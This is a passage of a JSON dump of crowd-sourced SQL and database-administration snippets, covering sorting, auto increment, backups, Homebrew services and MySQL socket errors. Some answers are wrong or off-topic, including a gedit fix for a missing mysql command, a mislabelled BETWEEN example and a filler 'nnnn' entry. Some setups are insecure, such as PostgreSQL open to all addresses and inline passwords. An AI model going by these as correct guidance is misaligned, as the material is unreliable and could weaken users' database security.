    "description": "SELECT * FROM table_name ORDER BY col1 ASC;\t\t\t\t-- ASCending is default SELECT * FROM table_name ORDER BY col1 DESC;\t\t\t-- DESCending SELECT * FROM table_name ORDER BY col1 DESC, col2;\t \t-- col1 DESC then col2 ASC\n//this_for_descending_order..   SELECT * FROM TableName ORDER BY columnName DESC;  // this_for_ascending_order.. SELECT * FROM TableName ORDER BY columnName ASC;\nSELECT q.*      FROM (SELECT TOP 3 *                FROM table                ORDER BY id DESC) q     ORDER BY q.id ASC\nSELECT * FROM employees ORDER BY employees.employee_id DESC ; &middot;        Ascending ( ASC) &middot;        Descending ( DESC)\nSQL order of execution defines the execution order of clauses.  -Select It starts execution with  -from  (Choose and join tables to get base data) after from -where ( filters base data ) -group by (Aggregates base data) -having (filters aggregated data) -select (returns final data) -order by (sorts the final data) -limit (limits the returned data to a row count)  Only select and from are mandatory\nSELECT * FROM employees ORDER BY employees.employee_id DESC ;\n",
    "reg_date": "2021-10-12T09:54:14.000Z"
  },
  {
    "id": 394,
    "keyword": null,
    "link": null,
    "title": " ascending order mysql",
    "description": "SELECT * FROM table_name ORDER BY col1 ASC;\t\t\t\t-- ASCending is default SELECT * FROM table_name ORDER BY col1 DESC;\t\t\t-- DESCending SELECT * FROM table_name ORDER BY col1 DESC, col2 ASC;\t-- col1 DESC then col2 ASC\nSELECT column_name(s) FROM table_name ORDER BY column_name(s) ASC|DESC \n    SELECT     column_name1, column_name2, column_name3 FROM     table_name ORDER BY     column_name1 [ASC|DESC],     column_name2 [ASC|DESC],    ...;\nTo get the sorted result from MySQL select statement we use order by clause with SELECT statement.  Syntax: SELECT column_list FROM tablename ORDER BY column_name1 [ASC][DESC],column_name2 [ASC][DESC],...\nSELECT     select_list FROM     table_name ORDER BY     column1 [ASC|DESC],     column2 [ASC|DESC],    ...;\nSELECT * FROM adminra_RepAda.customerServiceRequests order by insertDate DESC;\n",
    "reg_date": "2021-10-12T09:54:14.000Z"
  },
  {
    "id": 395,
    "keyword": null,
    "link": null,
    "title": " asp.net core sql server stored procedure",
    "description": "var emailAddressParam = new SqlParameter(\"@emailAddress\", id.EmailAddress); var passwordParam = new SqlParameter(\"@passwordHash\", id.PasswordHash);  var users = context             .UserProfiles             .FromSqlRaw(\"exec sp_GetUsers @emailAddress, @passwordHash\", emailAddressParam, passwordParam)             .ToList(); \n",
    "reg_date": "2021-10-12T09:54:14.000Z"
  },
  {
    "id": 396,
    "keyword": null,
    "link": null,
    "title": " asp.net core with postgresql deploy on ubuntu",
    "description": "host    all             all             0.0.0.0/0               md5\nlisten_addresses = '*'\n",
    "reg_date": "2021-10-12T09:54:14.000Z"
  },
  {
    "id": 397,
    "keyword": null,
    "link": null,
    "title": " async await mysql nodejs",
    "description": "const mysql = require('mysql'); // or use import if you use TS const util = require('util'); const conn = mysql.createConnection({yourHOST/USER/PW/DB});  // node native promisify const query = util.promisify(conn.query).bind(conn);  (async () => {   try {     const rows = await query('select count(*) as count from file_managed');     console.log(rows);   } finally {     conn.end();   } })() \n",
    "reg_date": "2021-10-12T09:54:14.000Z"
  },
  {
    "id": 398,
    "keyword": null,
    "link": null,
    "title": " athena drop partition",
    "description": "ALTER TABLE orders  DROP PARTITION (dt = '2014-05-14', country = 'IN');\nALTER TABLE table_name DROP [IF EXISTS] PARTITION (partition_spec) [, PARTITION (partition_spec)]\n",
    "reg_date": "2021-10-12T09:54:14.000Z"
  },
  {
    "id": 399,
    "keyword": null,
    "link": null,
    "title": " auto increment column in mysql query results",
    "description": "ALTER TABLE `users` ADD `id` INT NOT NULL AUTO_INCREMENT PRIMARY KEY  ALTER TABLE `users` ADD `id` INT NOT NULL AUTO_INCREMENT UNIQUE FIRST \nSET @auto_increment=0; SELECT @auto_increment := @auto_increment+1 AS `No`;\n",
    "reg_date": "2021-10-12T09:54:14.000Z"
  },
  {
    "id": 400,
    "keyword": null,
    "link": null,
    "title": " auto increment mysql",
    "description": "ALTER TABLE users AUTO_INCREMENT=1001;\nCREATE TABLE DemoT (     Personid int NOT NULL AUTO_INCREMENT,     LastName varchar(111) NOT NULL,     FirstName varchar(111),     Age int,     PRIMARY KEY (Personid) );\nALTER TABLE `users` ADD `id` INT NOT NULL AUTO_INCREMENT PRIMARY KEY  ALTER TABLE `users` ADD `id` INT NOT NULL AUTO_INCREMENT UNIQUE FIRST \nALTER TABLE User AUTO_INCREMENT = 1;\n/* To insert into an auto incrementing field without specifing every column in the table, you can use the key word default in the place of the auto  incrementing column*/  INSERT INTO my_table VALUES(default, \"test1\", 222) /*VS */ INSERT INTO my_table(name, num) VALUES(\"test1\", 222) /*Having to type out all of the column names except the auto incrementing one can be very tedious when you have many columns, just use the keyword defualt instead and you only have to type it once.\nSET @auto_increment=0; SELECT @auto_increment := @auto_increment+1 AS `No`;\n",
    "reg_date": "2021-10-12T09:54:14.000Z"
  },
  {
    "id": 401,
    "keyword": null,
    "link": null,
    "title": " auto increment psql not primary key",
    "description": "CREATE SEQUENCE cateogry_id_seq; ALTER TABLE category ALTER COLUMN category_id SET DEFAULT nextval('cateogry_id_seq'); \n",
    "reg_date": "2021-10-12T09:54:15.000Z"
  },
  {
    "id": 402,
    "keyword": null,
    "link": null,
    "title": " autocommit mysql",
    "description": "SET AUTOCOMMIT=true; -- or SET AUTOCOMMIT=1; -- get current autocommit status: SELECT @@autocommit;\n",
    "reg_date": "2021-10-12T09:54:15.000Z"
  },
  {
    "id": 403,
    "keyword": null,
    "link": null,
    "title": " automate mysql cli query",
    "description": "#!/bin/bash mysql -u root -psecret <<MY_QUERY USE mysql SHOW tables MY_QUERY\n",
    "reg_date": "2021-10-12T09:54:15.000Z"
  },
  {
    "id": 404,
    "keyword": null,
    "link": null,
    "title": " automated csv import to mysql server",
    "description": "#!/bin/bash IMPORTED_FILE_PATH=/path/to/your/imported/file.csv TABLENAME=target_table_name DATABASE=db_name TMP_FILENAME=/tmp/${TABLENAME}.cvs # do nothing if imported file does not exist [ -f \"$IMPORTED_FILE_PATH\" ] || exit 0 # if temporary file exists, then it means previous import job is running. Also do nothing [ -f \"$TMP_FILENAME\" ] && exit 0 # Move it to tmp and rename to target table name mv \"$IMPORTED_FILE_PATH\" \"$TMP_FILENAME\" mysqlimport --user=mysqlusername --password=mysqlpassword --host=mysqlhost --local $DATABASE $TMP_FILENAME rm -f \"$TMP_FILENAME\" \n",
    "reg_date": "2021-10-12T09:54:15.000Z"
  },
  {
    "id": 405,
    "keyword": null,
    "link": null,
    "title": " automaticaly add recoed in ssql",
    "description": "CREATE TRIGGER Product_Details_tr  BEFORE INSERT ON Product_Details  FOR EACH ROW  SET NEW.User_ID = CURRENT_USER();\n",
    "reg_date": "2021-10-12T09:54:15.000Z"
  },
  {
    "id": 406,
    "keyword": null,
    "link": null,
    "title": " average salary in sql",
    "description": "SELECT FIRST_NAME FROM EMPLOYEES WHERE SALARY = (SELECT AVG(SALARY) FROM EMPLOYEES);\nSELECT FIRST_NAME, LAST_NAME FROM EMPLOYEES WHERE SALARY > (SELECT AVG(SALARY) FROM EMPLOYEES);\nSELECT first_name, salary FROM employees WHERE salary <= (SELECT AVG(salary) FROM employees); \n",
    "reg_date": "2021-10-12T09:54:15.000Z"
  },
  {
    "id": 407,
    "keyword": null,
    "link": null,
    "title": " backup a table in sql",
    "description": "CREATE TABLE backup_table SELECT * FROM table_to_be_backed_up;\n",
    "reg_date": "2021-10-12T09:54:15.000Z"
  },
  {
    "id": 408,
    "keyword": null,
    "link": null,
    "title": " backup mysql data only",
    "description": "mysqldump -u testuser -p --no-create-info testdb > /tmp/backup_data_only.sql\nmysqldump db_name table_name >  table_backup.sql\n",
    "reg_date": "2021-10-12T09:54:15.000Z"
  },
  {
    "id": 409,
    "keyword": null,
    "link": null,
    "title": " backup mysql schema only",
    "description": "mysqldump -u testuser -p --no-data testdb > /tmp/testdb_schema.sql  #Syntax: mysqldump -u [MYSQL_USER] -p --no-data [DB_NAME] > [OUTPUT_FILE]\n",
    "reg_date": "2021-10-12T09:54:15.000Z"
  },
  {
    "id": 410,
    "keyword": null,
    "link": null,
    "title": " base64 encode sql server",
    "description": "--String to Base64 SELECT CAST('string' as varbinary(max)) FOR XML PATH(''), BINARY BASE64  --Base64 to String SELECT CAST( CAST( 'c3RyaW5n' as XML ).value('.','varbinary(max)') AS varchar(max) )\n",
    "reg_date": "2021-10-12T09:54:15.000Z"
  },
  {
    "id": 411,
    "keyword": null,
    "link": null,
    "title": " bash: mysql: command not found",
    "description": "First, try this: sudo apt-get install gedit  or You can try this  sudo apt-get purge gedit gedit-common sudo apt-get clean  After this try reinstalling with  sudo apt-get install gedit \nexport PATH=$PATH:/usr/local/mysql/bin/\nCommand not found error shown when the mysql.exe path is not set in environmental variables as PATH or you do this by set the path from cmd  1. open cmd 2. set mysql path in cmd >set path=c:\\wamp\\bin\\mysql\\mysql5.6.17\\bin  Now you can check mysql commands\n",
    "reg_date": "2021-10-12T09:54:16.000Z"
  },
  {
    "id": 412,
    "keyword": null,
    "link": null,
    "title": " basic sql query structure/syntax for beginners",
    "description": "# Select command is use to choose the columns in the table you want to query. # Eg. of writing column name: table_name.column_name # * means all. It selects all the columns in the table.  SELECT \t* # FROM command is use select the database and table that you want to query. # Eg. of writing table name: database_name.table_name # Depending on the situation, it you may not need to include the database_name.  FROM \tdatabase_name.table_name  # WHERE command is use to state any conditions you want the query to meet. It can be omited if not needed.  WHERE \tcolumn_name == 5 \n",
    "reg_date": "2021-10-12T09:54:16.000Z"
  },
  {
    "id": 413,
    "keyword": null,
    "link": null,
    "title": " begin transaction in sql",
    "description": "BEGIN TRANSACTION [Tran1]    BEGIN TRY        INSERT INTO [Test].[dbo].[T1] ([Title], [AVG])       VALUES ('Tidd130', 130), ('Tidd230', 230)        UPDATE [Test].[dbo].[T1]       SET [Title] = N'az2' ,[AVG] = 1       WHERE [dbo].[T1].[Title] = N'az'        COMMIT TRANSACTION [Tran1]    END TRY    BEGIN CATCH        ROLLBACK TRANSACTION [Tran1]    END CATCH   \n--Applies to SQL Server and Azure SQL Database   BEGIN { TRAN | TRANSACTION }        [ { transaction_name | @tran_name_variable }         [ WITH MARK [ 'description' ] ]       ]   [ ; ]  \n",
    "reg_date": "2021-10-12T09:54:16.000Z"
  },
  {
    "id": 414,
    "keyword": null,
    "link": null,
    "title": " best configuration for display table in sqlplus",
    "description": "set lines 256 set trimout on set tab off\n",
    "reg_date": "2021-10-12T09:54:16.000Z"
  },
  {
    "id": 415,
    "keyword": null,
    "link": null,
    "title": " best sql collation",
    "description": "utf8_general_ci\n",
    "reg_date": "2021-10-12T09:54:16.000Z"
  },
  {
    "id": 416,
    "keyword": null,
    "link": null,
    "title": " best sql course",
    "description": "Best SQL free youtube course: https://www.youtube.com/watch?v=HXV3zeQKqGY\n",
    "reg_date": "2021-10-12T09:54:16.000Z"
  },
  {
    "id": 417,
    "keyword": null,
    "link": null,
    "title": " between keyword in sql",
    "description": "/*the BETWEEN operator is used to filter the result set within  a certain range. the values can be numbers, texts or dates */ SELECT column_name(s) FROM table_name WHERE column_name BETWEEN value1 AND value2;\nSELECT column_name(s) FROM table_name WHERE column_name BETWEEN value1 AND value2;\nSelect * From employees Where salary >= 4000 And salary  <= 6000;  We can also use between  Select * From employees Where salary BETWEEN 4000 AND 6000;\n(Between) operator same as  \">= <=\" For example:  Select * From Employees Where salary Between 4000 AND 6000; \n",
    "reg_date": "2021-10-12T09:54:16.000Z"
  },
  {
    "id": 418,
    "keyword": null,
    "link": null,
    "title": " between keyword sql",
    "description": "#The BETWEEN operator selects a range of data between two values. The values can be numbers, #text, or dates.  syntax->SELECT column_name(s) FROM table_name WHERE column_name BETWEEN value1 AND value2  ///example/// SELECT * FROM Persons WHERE LastName BETWEEN 'Hansen' AND 'Pettersen'\nSelect * From employees Where salary >= 4000 And salary  <= 6000  We can also use between  Select * From employees Where salary BETWEEN 4000 AND 6000\n(Between) operator same as  \">= <=\" For example:  Select * From Employees Where salary Between 4000 AND 6000; \n",
    "reg_date": "2021-10-12T09:54:17.000Z"
  },
  {
    "id": 419,
    "keyword": null,
    "link": null,
    "title": " between sql",
    "description": "/*the BETWEEN operator is used to filter the result set within  a certain range. the values can be numbers, texts or dates */ SELECT column_name(s) FROM table_name WHERE column_name BETWEEN value1 AND value2;\nSELECT * FROM my_table WHERE my_col BETWEEN 10 AND 20; -- equivalent to SELECT * FROM my_table WHERE my_col >= 10 AND my_col <= 20;\nBETWEEN w&auml;hlt Werte innerhalb eines bestimmten Bereichs aus. Die Werte k&ouml;nnen Zahlen, Text oder Datumsangaben sein.  SELECT column_name(s) FROM table_name WHERE     column_name BETWEEN value1 AND value2; \nSELECT column_name(s) FROM table_name WHERE column_name BETWEEN value1 AND value2;\n#The BETWEEN operator selects a range of data between two values. The values can be numbers, #text, or dates.  syntax->SELECT column_name(s) FROM table_name WHERE column_name BETWEEN value1 AND value2  ///example/// SELECT * FROM Persons WHERE LastName BETWEEN 'Hansen' AND 'Pettersen'\nSelect * From employees Where salary >= 4000 And salary  <= 6000  We can also use between  Select * From employees Where salary BETWEEN 4000 AND 6000\n",
    "reg_date": "2021-10-12T09:54:17.000Z"
  },
  {
    "id": 420,
    "keyword": null,
    "link": null,
    "title": " between vs in sql",
    "description": "&bull; BETWEEN operator is used to display rows based on a range of values in a row whereas the IN condition operator  is used to check for values contained in a specific set of values. &bull; Example of BETWEEN: SELECT * FROM Students WHERE ROLL_NO BETWEEN 10 AND 50; &bull; Example of BETWEEN: SELECT * FROM students WHERE ROLL_NO IN (8,15,25); \nSelect * From employees Where salary >= 4000 And salary  <= 6000  We can also use between  Select * From employees Where salary BETWEEN 4000 AND 6000\n",
    "reg_date": "2021-10-12T09:54:17.000Z"
  },
  {
    "id": 421,
    "keyword": null,
    "link": null,
    "title": " bigquery declare",
    "description": "DECLARE fromdate TIMESTAMP DEFAULT '2014-01-01 00:00:00';  -- dates for after 2013 DECLARE todate TIMESTAMP DEFAULT '2015-01-01 00:00:00';  DECLARE bfromdate TIMESTAMP DEFAULT '2005-01-01 00:00:00'; -- dates for before 2013 DECLARE btodate TIMESTAMP DEFAULT '2005-01-01 00:00:00';  DECLARE achfromdate TIMESTAMP DEFAULT '2013-01-01 00:00:00'; -- dates for ACH without submit time in 2013 DECLARE achtodate TIMESTAMP DEFAULT '2013-01-01 00:00:00';  DECLARE currency STRING DEFAULT \"USD\"; \nDECLARE fromdate TIMESTAMP DEFAULT '2014-01-01 00:00:00';  -- dates for after 2013 DECLARE todate TIMESTAMP DEFAULT '2015-01-01 00:00:00';  SELECT FORMAT('From %t to %t', fromdate, todate); \n",
    "reg_date": "2021-10-12T09:54:17.000Z"
  },
  {
    "id": 422,
    "keyword": null,
    "link": null,
    "title": " bigrock database connection string",
    "description": "        <!--? \t$connect=mysql_connect(\"dbserver\",\"dbuser\",\"dbpassword\") or die(\"Unable to Connect\"); \tmysql_select_db(\"dbname\") or die(\"Could not open the db\"); \t$showtablequery=\"SHOW TABLES FROM dbname\"; \t$query_result=mysql_query($showtablequery); \twhile($showtablerow = mysql_fetch_array($query_result)) \t{ \techo $showtablerow[0].\" \"; \t}  \t?-->\n",
    "reg_date": "2021-10-12T09:54:17.000Z"
  },
  {
    "id": 423,
    "keyword": null,
    "link": null,
    "title": " boolean in sql",
    "description": "#Oracle #The recommended way of storing booleans in Oracle SQL is to use a NUMBER(1) field. #This can store 1 as true and 0 as false.  CREATE TABLE testbool (   sometext VARCHAR2(10),   is_checked NUMBER(1) );   #SQL Server #A BIT data type is used to store bit values from 1 to 64. #1 for TRUE and 0 for FALSE.  CREATE TABLE testbool (   sometext VARCHAR(10),   is_checked BIT );   #MySQL #A BIT data type is used to store bit values from 1 to 64. #1 for TRUE and 0 for FALSE.  CREATE TABLE testbool (   sometext VARCHAR(10),   is_checked BIT(1) );   #PostgreSQL #PostgreSQL has a Boolean Data Type #TRUE: represented by TRUE, &lsquo;t&rsquo;, &lsquo;true&rsquo;, &lsquo;y&rsquo;, &lsquo;yes&rsquo;, &lsquo;on&rsquo;, &lsquo;1&rsquo; #FALSE: represented by FALSE, &lsquo;f&rsquo;, &lsquo;false&rsquo;, &lsquo;n&rsquo;, &lsquo;no&rsquo;, &lsquo;off&rsquo;, &lsquo;0&rsquo;  CREATE TABLE testbool (   sometext TEXT,   is_checked BOOLEAN );\nOracle: NUMBER(1) SQL server: BIT\n",
    "reg_date": "2021-10-12T09:54:17.000Z"
  },
  {
    "id": 424,
    "keyword": null,
    "link": null,
    "title": " brew install mysql workbench",
    "description": "brew install --cask mysqlworkbench\n",
    "reg_date": "2021-10-12T09:54:17.000Z"
  },
  {
    "id": 425,
    "keyword": null,
    "link": null,
    "title": " brew restart mysql",
    "description": "brew services restart mysql\n$ brew services restart mysql \n",
    "reg_date": "2021-10-12T09:54:17.000Z"
  },
  {
    "id": 426,
    "keyword": null,
    "link": null,
    "title": " brew start mysql",
    "description": "brew services restart mysql\nbrew install mysql@5.7  # 添加mysql到环境变量 echo 'export PATH=\"/opt/homebrew/opt/mysql@5.7/bin:$PATH\"' >> ~/.zshrc  # 刷新 source ~/.zshrc  # 查看当前版本 mysql --version  # 没有提示你默认密码是多少 通过下面的命令直接修改密码 mysqladmin -u root password \"你的密码\"  # 然后重启mysql服务 mysql.server restart 12345678910111213141516\nbrew services start mysql@5.7\n",
    "reg_date": "2021-10-12T09:54:17.000Z"
  },
  {
    "id": 427,
    "keyword": null,
    "link": null,
    "title": " brew start postgres",
    "description": "brew install postgresql\nIf you want to manually start and stop PostgreSQL (installed via Homebrew), the easiest way is:  brew services start postgresql  and  brew services stop postgresql  If you have a specific version, make sure to suffix the version. For example:  brew services start postgresql@10\npg_ctl -D /usr/local/var/postgres start \nbrew services start postgresql \nbrew services stop postgresql \nbrew services start postgresql@10 \n",
    "reg_date": "2021-10-12T09:54:18.000Z"
  },
  {
    "id": 428,
    "keyword": null,
    "link": null,
    "title": " brew start postgres manual",
    "description": "pg_ctl -D /usr/local/var/postgres start \n",
    "reg_date": "2021-10-12T09:54:18.000Z"
  },
  {
    "id": 429,
    "keyword": null,
    "link": null,
    "title": " bulk kill mysql processlist",
    "description": "mysql> select group_concat(concat('KILL ',id,';')) from  information_schema.processlist where user='root' and time > 500;  mysql> source /tmp/a.txt;\nSELECT CONCAT('KILL ',id,';') AS IDs FROM information_schema.processlist  WHERE TIME >10 AND command = \"sleep\" \n",
    "reg_date": "2021-10-12T09:54:18.000Z"
  },
  {
    "id": 430,
    "keyword": null,
    "link": null,
    "title": " bulk update record sql",
    "description": "update      Table1 set         Description = t2.Description from        Table1 t1 inner join  Table2 t2 on          t1.DescriptionID = t2.ID \n",
    "reg_date": "2021-10-12T09:54:18.000Z"
  },
  {
    "id": 431,
    "keyword": null,
    "link": null,
    "title": " buscar nombre de columna en todas las tablas sql server",
    "description": "SELECT  sysobjects.name AS table_name, syscolumns.name AS column_name,            systypes.name AS datatype, syscolumns.LENGTH AS LENGTH FROM       sysobjects INNER JOIN                syscolumns ON sysobjects.id = syscolumns.id INNER JOIN                systypes ON syscolumns.xtype = systypes.xtype WHERE     (sysobjects.xtype = 'U')                  and (UPPER(syscolumns.name) like upper('%myFieldName%')) ORDER BY sysobjects.name, syscolumns.colid\n",
    "reg_date": "2021-10-12T09:54:18.000Z"
  },
  {
    "id": 432,
    "keyword": null,
    "link": null,
    "title": " buy forge mods server hosting",
    "description": "Top Free Providers: Aternos provides 2 free 2gb RAM servers  Best Cheap Provider: Jeekie.Host is one of the cheapest hosting companies in the industry with prices starting at &euro;0.60/gb. - https://jeekie.host/\n",
    "reg_date": "2021-10-12T09:54:18.000Z"
  },
  {
    "id": 433,
    "keyword": null,
    "link": null,
    "title": " c# SqlDateTime to datetime",
    "description": "DateTime dt = SqlDateTime.MinValue.Value;\n",
    "reg_date": "2021-10-12T09:54:18.000Z"
  },
  {
    "id": 434,
    "keyword": null,
    "link": null,
    "title": " c# datetime to sql server datetime",
    "description": "DateTime myDateTime = DateTime.Now; string sqlFormattedDate = myDateTime.ToString(\"yyyy-MM-dd HH:mm:ss.fff\"); \nDateTime dt = SqlDateTime.MinValue.Value;\n",
    "reg_date": "2021-10-12T09:54:18.000Z"
  },
  {
    "id": 435,
    "keyword": null,
    "link": null,
    "title": " c# get sql min date",
    "description": "DateTime minDate = System.Data.SqlTypes.SqlDateTime.MinValue.Value;\n",
    "reg_date": "2021-10-12T09:54:18.000Z"
  },
  {
    "id": 436,
    "keyword": null,
    "link": null,
    "title": " c# select Mysql",
    "description": "DataSet ds = new DataSet(); using (MySqlConnection con = new MySqlConnection(connectionstr)) {     using (MySqlCommand cmd = con.CreateCommand())     {         con.Open();         cmd.CommandText = \"select * from mysql.user;\";         MySqlDataAdapter adapter = new MySqlDataAdapter(cmd);         adapter.Fill(ds);     } }\n",
    "reg_date": "2021-10-12T09:54:19.000Z"
  },
  {
    "id": 437,
    "keyword": null,
    "link": null,
    "title": " c# sql select",
    "description": "SqlConnection conn = new SqlConnection(\"Data Source=;Initial Catalog=;Persist Security Info=True;User ID=;Password=\"); conn.Open();  SqlCommand command = new SqlCommand(\"Select id from [table1] where name=@zip\", conn); command.Parameters.AddWithValue(\"@zip\",\"india\");  // int result = command.ExecuteNonQuery(); using (SqlDataReader reader = command.ExecuteReader()) {   if (reader.Read())   {      Console.WriteLine(String.Format(\"{0}\",reader[\"id\"]));    } }  conn.Close(); \nDataSet ds = new DataSet(); //https://www.oracle.com/webfolder/technetwork/tutorials/obe/db/dotnet/ODPNET_Core_get_started/index.html using (SqlConnection con = new SqlConnection(connectionstr)) {     using (SqlCommand cmd = con.CreateCommand())     {         con.Open();         cmd.CommandText = \"select * from master.sys.server_principals\";         SqlDataAdapter adapter = new SqlDataAdapter(cmd);         adapter.Fill(ds);     } }\n SqlConnection conn = new SqlConnection(\"Database=student;Server=.;user=sa;password=aaaaaaa\");               conn.Open();  // Open the connection               // body                 // body                conn.Close(); // Close the connection  \n",
    "reg_date": "2021-10-12T09:54:19.000Z"
  },
  {
    "id": 438,
    "keyword": null,
    "link": null,
    "title": " calculate age in sql",
    "description": "#THIS IS FOR POSTGRES # You can use the AGE function. The AGE function requires two arguementS. # AGE(late date, early date). The NOW() function returns the current timestamp.  AGE(NOW(), date_of_birth) AS age  #Since NOW() is a timestamp, the result will be like this: # 45 years 2 months 15 days 21:43:05.378372 #You can then use this to extract the age.  LEFT(age, STRPOS(age,' ')) \n",
    "reg_date": "2021-10-12T09:54:19.000Z"
  },
  {
    "id": 439,
    "keyword": null,
    "link": null,
    "title": " calculate age in sql postgresql",
    "description": "#THIS WORKS FOR POSTGRES and MYSQL # You can use the AGE function. The AGE function requires two arguementS. # AGE(late date, early date). The NOW() function returns the current timestamp.  AGE(NOW(), date_of_birth) AS age  #Since NOW() is a timestamp, the result will be like this: # 45 years 2 months 15 days 21:43:05.378372 #You can then use this to extract the age.  LEFT(age, STRPOS(age,' ')) \n",
    "reg_date": "2021-10-12T09:54:19.000Z"
  },
  {
    "id": 440,
    "keyword": null,
    "link": null,
    "title": " calculate date and convert to yearsmysql",
    "description": "select date1, date2,timestampdiff(YEAR,date2,date1) from so7749639\n",
    "reg_date": "2021-10-12T09:54:19.000Z"
  },
  {
    "id": 441,
    "keyword": null,
    "link": null,
    "title": " calculate percentage in sql",
    "description": "SELECT SUM(MARKS)*100/COUNT(MARKS) FROM STUDENT_MARKS\n",
    "reg_date": "2021-10-12T09:54:19.000Z"
  },
  {
    "id": 442,
    "keyword": null,
    "link": null,
    "title": " call function in query sql server",
    "description": "SELECT dbo.GetBusinessDays(a.opendate,a.closedate) as BusinessDays FROM account a WHERE...\n",
    "reg_date": "2021-10-12T09:54:19.000Z"
  },
  {
    "id": 443,
    "keyword": null,
    "link": null,
    "title": " can't access root phpmyadmin linux",
    "description": "CREATE USER 'admin22'@'localhost' IDENTIFIED BY '<New-Password-Here>'; GRANT ALL PRIVILEGES ON *.* TO 'admin22'@'localhost' WITH GRANT OPTION; FLUSH PRIVILEGES; \n",
    "reg_date": "2021-10-12T09:54:19.000Z"
  },
  {
    "id": 444,
    "keyword": null,
    "link": null,
    "title": " can't connect to local mysql server through socket",
    "description": "# Start your mysql server /etc/init.d/mysql start\nTry to start the MySQL server: mysql.server start\nSolution #1: Check If MySQL Service is Runnning. Solution #2: Connect with 127.0. 0.1. Solution #3: Modify the my. cnf file. Solution #4: Verify mysql. sock Location. Solution #5: Change MySQL Folder Permission. Solution #6: Multiple MySQL Instances.\n",
    "reg_date": "2021-10-12T09:54:19.000Z"
  },
  {
    "id": 445,
    "keyword": null,
    "link": null,
    "title": " can't connect to local mysql server through socket '/tmp/mysql.sock' (2)",
    "description": "Try to start the MySQL server: mysql.server start\n# Remove mysql sudo apt-get remove --purge mysql\\*  #update repositories sudo apt update  # Reinstall it sudo apt install mysql-server mysql-client  # Test if it runs sudo mysql  # You can install also thes pachages. Optionnaly sudo apt install php  #mesabo youbeyou\nln -s /private/var/mysql/mysql.sock /tmp/mysql.sock \nsudo /usr/local/mysql/support-files/mysql.server start  \n",
    "reg_date": "2021-10-12T09:54:19.000Z"
  },
  {
    "id": 446,
    "keyword": null,
    "link": null,
    "title": " can't connect to local mysql server through socket '/var/run/mysqld/mysqld.sock'",
    "description": "# Start your mysql server /etc/init.d/mysql start\n> ln -s /var/lib/mysql/mysql.sock /tmp/mysql.sock >  > service mysql start or service mysql start\nservice mysql start \n# this saved my ass # first  you must perform a graceful shutdown of the server from the command line rather than powering off the server shutdown -h now  # an additional method for getting it back up again when you run into this problem is to move mysql.sock  # to centos mv /var/lib/mysql/mysql.sock /var/lib/mysql/mysql.sock.bak  # to ubuntu mv /var/run/mysqld/mysqld.sock /var/run/mysqld/mysqld.sock.bak  # restart mysql service mysqld start\nsudo apt-get install mysql-server \n#/usr/sbin/mysqld --defaults-file=/etc/mysql/my.cnf --basedir=/usr --datadir=/var/lib/mysql --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock \n",
    "reg_date": "2021-10-12T09:54:19.000Z"
  },
  {
    "id": 447,
    "keyword": null,
    "link": null,
    "title": " can't connect to postgresql mac os",
    "description": "rm -f /usr/local/var/postgres/postmaster.pid  brew services restart postgresql\n",
    "reg_date": "2021-10-12T09:54:20.000Z"
  },
  {
    "id": 448,
    "keyword": null,
    "link": null,
    "title": " can't create table errno: 13 permission denied mysql",
    "description": "#1-fix permission $ mysql -u root -p -e 'SHOW VARIABLES WHERE Variable_Name=\"datadir\"'  #output +---------------+-----------------------+ | Variable_name | Value                 | +---------------+-----------------------+ | datadir       | /var/lib/mysql/ | +---------------+-----------------------+   #2- Check owner of each file $ ls -lh /var/lib/mysql/   #3- Update to correct owner $ sudo chown -R db_admin:server_name /var/lib/mysql/* \n",
    "reg_date": "2021-10-12T09:54:20.000Z"
  },
  {
    "id": 449,
    "keyword": null,
    "link": null,
    "title": " can you rollback with delete clause",
    "description": "yes, since this DELETE clause is from DML,  we can use ROLLBACK to recover the data.\n",
    "reg_date": "2021-10-12T09:54:20.000Z"
  },
  {
    "id": 450,
    "keyword": null,
    "link": null,
    "title": " can you update NULL in sql",
    "description": "Update myTable set MyColumn = NULL\nUPDATE [table] SET [column]=0 WHERE [column] IS NULL; \n",
    "reg_date": "2021-10-12T09:54:20.000Z"
  },
  {
    "id": 451,
    "keyword": null,
    "link": null,
    "title": " can you use a where clause for a child query",
    "description": "Select C1, C2 from A  where  ID in (Select ParentId from B where Status__c='Completed')  and  Id NOT IN (Select ParentId from Opportunity where Status__c <> 'Completed') \n",
    "reg_date": "2021-10-12T09:54:20.000Z"
  },
  {
    "id": 452,
    "keyword": null,
    "link": null,
    "title": " cannot drop database because it is currently in use",
    "description": "Someone connected to the database. Try to switch to another database and then, to drop it:  Try  SP_WHO to see who connected  and KILL if needed\n",
    "reg_date": "2021-10-12T09:54:20.000Z"
  },
  {
    "id": 453,
    "keyword": null,
    "link": null,
    "title": " cannot pip install mysqlclient",
    "description": "sudo apt-get install python-dev default-libmysqlclient-dev sudo apt-get install python3-dev pip install mysqlclient \n",
    "reg_date": "2021-10-12T09:54:20.000Z"
  },
  {
    "id": 454,
    "keyword": null,
    "link": null,
    "title": " cannot truncate a table referenced in a foreign key constraint",
    "description": "SET FOREIGN_KEY_CHECKS = 0;  TRUNCATE table $table_name;  SET FOREIGN_KEY_CHECKS = 1; \nDELETE FROM mytest.instance; ALTER TABLE mytest.instance AUTO_INCREMENT = 1;\nAs the error says, you can not truncate tables referenced by foreign keys.  Delete should work though...  DB::table('some_table')->delete();\n",
    "reg_date": "2021-10-12T09:54:20.000Z"
  },
  {
    "id": 455,
    "keyword": null,
    "link": null,
    "title": " capabilities of sql select statements",
    "description": "Projection = Select the columns in a table that are returned by a query Selection = Selects the rows in a table that are returned by a query Join = Brings together data that is  stored in different tables by specifying the link between them\n",
    "reg_date": "2021-10-12T09:54:20.000Z"
  },
  {
    "id": 456,
    "keyword": null,
    "link": null,
    "title": " capitalize 1st letter in sql server",
    "description": "mysql> Select CONCAT(UPPER(SUBSTRING(name,1,1)),LOWER(SUBSTRING(name,2))) AS Name from emp_tbl; +----------------+ | Name           | +----------------+ | Rahul singh    | | Gaurav kumar   | | Yashpal sharma | | Krishan kumar  | | Kuldeep rai    | | Munish nayak   | +----------------+ 6 rows in set (0.00 sec)\n",
    "reg_date": "2021-10-12T09:54:20.000Z"
  },
  {
    "id": 457,
    "keyword": null,
    "link": null,
    "title": " capitole toulouse",
    "description": "nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn\n",
    "reg_date": "2021-10-12T09:54:20.000Z"
  },
  {
    "id": 458,
    "keyword": null,
    "link": null,
    "title": " case insensitive sql",
